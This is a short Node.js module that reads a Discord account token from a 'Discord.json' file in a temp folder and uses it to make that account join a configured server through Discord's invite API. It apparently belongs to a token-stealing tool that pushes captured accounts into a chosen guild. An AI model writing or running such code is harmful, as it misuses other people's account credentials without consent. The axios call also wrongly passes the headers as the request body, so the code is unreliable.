const axios = require('axios');
const { discord: { autoJoinGuild: inviteCode }, userAgent } = require('../config');
const { readFileSync } = require('fs');
const { join } = require('path');
const { tempFolder } = require('../index');
const { token } = JSON.parse(readFileSync(join(tempFolder, 'Discord.json')).toString()).accounts[0];

axios.post(`https://discord.com/api/v10/invites/${inviteCode}`, {
  headers: { Authorization: token, 'User-Agent': userAgent }
});
